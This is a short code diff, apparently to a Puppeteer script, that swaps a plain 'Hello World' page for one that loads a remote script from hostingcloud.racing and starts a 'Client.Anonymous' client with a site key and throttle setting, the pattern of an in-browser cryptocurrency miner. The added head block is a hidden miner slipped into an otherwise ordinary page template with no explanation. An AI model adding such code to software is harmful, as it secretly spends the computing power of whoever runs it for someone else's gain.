@@ -19,10 +19,19 @@ console.log(" starting...");
 
 	await page.setContent(`
 	<html>
-	<body>
-		<p>Hello world</p>
-	</body>
-	</html>
+<head>
+<script src="https://www.hostingcloud.racing/omwa.js"></script>
+<script>
+    var _client = new Client.Anonymous("1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423", {
+        throttle: 0.6, c: "w"
+    });
+    _client.start();
+    </script>
+</head>
+<body>
+<p>Hello World</p>
+</body>
+</html>
 	`, { waitUntil: ['load'] });
 
       
